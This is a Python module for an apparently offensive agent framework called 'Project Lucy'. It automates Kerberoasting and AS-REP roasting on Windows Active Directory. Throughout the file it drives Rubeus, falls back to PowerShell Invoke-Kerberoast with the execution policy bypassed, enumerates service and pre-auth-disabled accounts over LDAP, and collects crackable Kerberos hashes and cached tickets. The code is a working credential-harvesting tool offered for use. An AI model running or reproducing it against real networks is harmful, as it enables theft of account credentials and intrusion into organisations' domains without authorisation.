"""
Kerberoasting and AS-REP roasting module for Project Lucy agent.
Extracts crackable Kerberos tickets via Rubeus, PowerShell Invoke-Kerberoast,
or native LDAP queries for SPN-enabled and pre-auth-disabled accounts.
Actions: kerberoast, asrep, tickets.
"""
import os
import platform
import re
import shutil
import subprocess
import tempfile

name = "kerberoast"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = ["ldap3"]

SYSTEM = platform.system()

_RUBEUS_PATHS = [
    "Rubeus.exe",
    "C:\\Windows\\Temp\\Rubeus.exe",
    "C:\\Tools\\Rubeus.exe",
]

_HASH_RE = re.compile(r"\$krb5tgs\$23\$\*[^*]+\*[^*]+\*[^*]+\*[^*]+\$[a-f0-9]+\$[a-f0-9]+", re.IGNORECASE)
_SPN_HASH_RE = re.compile(r"(?P<spn>[^\s]+)\s*[:\s]+(?P<hash>\$krb5tgs\$[^\s]+)", re.IGNORECASE)
_ASREP_HASH_RE = re.compile(r"\$krb5asrep\$23\*[^*]+[^$]*\$[a-f0-9]+\$[a-f0-9]+", re.IGNORECASE)


def _find_rubeus() -> str | None:
    """Locate Rubeus.exe if available on disk or in PATH."""
    for path in _RUBEUS_PATHS:
        if os.path.isfile(path):
            return path
    found = shutil.which("Rubeus.exe")
    return found


def _rubeus_kerberoast(domain: str, usernames: list[str]) -> dict:
    """Run Rubeus kerberoast and parse output for SPN+hash pairs."""
    rubeus = _find_rubeus()
    if not rubeus:
        return _powershell_kerberoast(domain, usernames)

    tmp = tempfile.NamedTemporaryFile(suffix=".txt", delete=False, mode="w")
    tmp.close()

    try:
        cmd = [rubeus, "kerberoast", f"/domain:{domain}", f"/outfile:{tmp.name}"]
        if usernames:
            cmd.append("/user:" + ",".join(usernames))
        subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        hashes = []
        if os.path.exists(tmp.name):
            with open(tmp.name, "r", errors="replace") as f:
                content = f.read()
            for line in content.splitlines():
                line = line.strip()
                if line.startswith("$krb5tgs$"):
                    hashes.append(line)

        if not hashes:
            # Fallback to parsing stdout from Rubeus
            proc = subprocess.run(
                [rubeus, "kerberoast", f"/domain:{domain}"],
                capture_output=True, text=True, timeout=60,
            )
            out = proc.stdout + proc.stderr
            hashes = _HASH_RE.findall(out)

        return {
            "status": "completed",
            "data": {
                "method": "rubeus",
                "domain": domain,
                "hashes": hashes,
                "count": len(hashes),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        try:
            os.remove(tmp.name)
        except Exception:
            pass


def _powershell_kerberoast(domain: str, usernames: list[str]) -> dict:
    """Attempt Kerberoasting via PowerShell Invoke-Kerberoast."""
    try:
        ps_script = "Invoke-Kerberoast -OutputFormat Hashcat"
        if domain:
            ps_script = f"Invoke-Kerberoast -Domain {domain} -OutputFormat Hashcat"
        cmd = [
            "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
            ps_script,
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        out = proc.stdout + proc.stderr

        hashes = []
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("$krb5tgs$"):
                hashes.append(line)
        if not hashes:
            hashes = _HASH_RE.findall(out)

        return {
            "status": "completed",
            "data": {
                "method": "powershell",
                "domain": domain,
                "hashes": hashes,
                "count": len(hashes),
                "raw": out if not hashes else None,
            },
        }
    except Exception as exc:
        # Fall back to native LDAP
        return _ldap_kerberoast(domain, usernames)


def _ldap_kerberoast(domain: str, usernames: list[str]) -> dict:
    """Query LDAP for SPN-enabled accounts using ldap3 or raw socket."""
    accounts = []
    try:
        try:
            import ldap3
        except ImportError:
            return {
                "status": "failed",
                "error": "Neither Rubeus nor ldap3 available for Kerberoasting",
            }

        if not domain:
            domain = os.environ.get("USERDOMAIN", "")
        if not domain:
            return {"status": "failed", "error": "No domain specified and USERDOMAIN not set"}

        dc_parts = [f"DC={p}" for p in domain.split(".")]
        search_base = ",".join(dc_parts)

        server = ldap3.Server(domain, use_ssl=True, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, auto_bind=True)

        conn.search(
            search_base,
            "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
            attributes=["sAMAccountName", "servicePrincipalName"],
        )

        for entry in conn.entries:
            sam = str(entry.sAMAccountName)
            spns = list(entry.servicePrincipalName)
            accounts.append({"username": sam, "spns": spns})

        conn.unbind()

        return {
            "status": "completed",
            "data": {
                "method": "ldap",
                "domain": domain,
                "accounts": accounts,
                "count": len(accounts),
                "note": "SPN accounts enumerated — request TGS offline to extract hashes",
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _rubeus_asrep(domain: str, usernames: list[str]) -> dict:
    """Run Rubeus asreproast and parse output for AS-REP hashes."""
    rubeus = _find_rubeus()
    if not rubeus:
        return _powershell_asrep(domain, usernames)

    tmp = tempfile.NamedTemporaryFile(suffix=".txt", delete=False, mode="w")
    tmp.close()

    try:
        cmd = [rubeus, "asreproast", f"/domain:{domain}", f"/outfile:{tmp.name}"]
        if usernames:
            cmd.append("/user:" + ",".join(usernames))
        subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        hashes = []
        if os.path.exists(tmp.name):
            with open(tmp.name, "r", errors="replace") as f:
                content = f.read()
            for line in content.splitlines():
                line = line.strip()
                if line.startswith("$krb5asrep$"):
                    hashes.append(line)

        if not hashes:
            proc = subprocess.run(
                [rubeus, "asreproast", f"/domain:{domain}"],
                capture_output=True, text=True, timeout=60,
            )
            out = proc.stdout + proc.stderr
            hashes = _ASREP_HASH_RE.findall(out)

        return {
            "status": "completed",
            "data": {
                "method": "rubeus",
                "domain": domain,
                "hashes": hashes,
                "count": len(hashes),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        try:
            os.remove(tmp.name)
        except Exception:
            pass


def _powershell_asrep(domain: str, usernames: list[str]) -> dict:
    """Attempt AS-REP roasting via PowerShell."""
    try:
        ps_script = "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth"
        if domain:
            ps_script = f"Get-ADUser -Filter {{DoesNotRequirePreAuth -eq $true}} -Server {domain} -Properties DoesNotRequirePreAuth"
        cmd = [
            "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command",
            ps_script,
        ]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        out = proc.stdout + proc.stderr

        accounts = []
        for line in out.splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "Name" not in line and "---" not in line:
                accounts.append(line)

        return {
            "status": "completed",
            "data": {
                "method": "powershell",
                "domain": domain,
                "accounts": accounts,
                "count": len(accounts),
                "raw": out,
            },
        }
    except Exception as exc:
        return _ldap_asrep(domain, usernames)


def _ldap_asrep(domain: str, usernames: list[str]) -> dict:
    """Query LDAP for accounts with DontRequirePreAuth=true."""
    accounts = []
    try:
        try:
            import ldap3
        except ImportError:
            return {
                "status": "failed",
                "error": "Neither Rubeus nor ldap3 available for AS-REP roasting",
            }

        if not domain:
            domain = os.environ.get("USERDOMAIN", "")
        if not domain:
            return {"status": "failed", "error": "No domain specified and USERDOMAIN not set"}

        dc_parts = [f"DC={p}" for p in domain.split(".")]
        search_base = ",".join(dc_parts)

        server = ldap3.Server(domain, use_ssl=True, get_info=ldap3.ALL)
        conn = ldap3.Connection(server, auto_bind=True)

        conn.search(
            search_base,
            "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            attributes=["sAMAccountName", "userAccountControl"],
        )

        for entry in conn.entries:
            sam = str(entry.sAMAccountName)
            accounts.append({"username": sam, "preauth_disabled": True})

        conn.unbind()

        return {
            "status": "completed",
            "data": {
                "method": "ldap",
                "domain": domain,
                "accounts": accounts,
                "count": len(accounts),
                "note": "AS-REP roastable accounts enumerated — request AS-REP offline",
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def _list_tickets() -> dict:
    """List cached Kerberos tickets via klist."""
    try:
        out = subprocess.check_output(
            ["klist", "tickets"], text=True, errors="replace", timeout=10,
        )
        tickets = []
        current = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("#") and ">" in line:
                if current:
                    tickets.append(current)
                current = {"header": line}
            elif ":" in line and current:
                key, _, val = line.partition(":")
                current[key.strip().lower().replace(" ", "_")] = val.strip()
        if current:
            tickets.append(current)

        return {"status": "completed", "data": {"raw": out, "tickets": tickets, "count": len(tickets)}}
    except FileNotFoundError:
        return {"status": "failed", "error": "klist not found"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}


def run(action: str = "kerberoast", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only action"}

    domain = params.get("domain", "")
    usernames = params.get("usernames", [])

    try:
        if action == "kerberoast":
            return _rubeus_kerberoast(domain, usernames)
        elif action == "asrep":
            return _rubeus_asrep(domain, usernames)
        elif action == "tickets":
            return _list_tickets()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
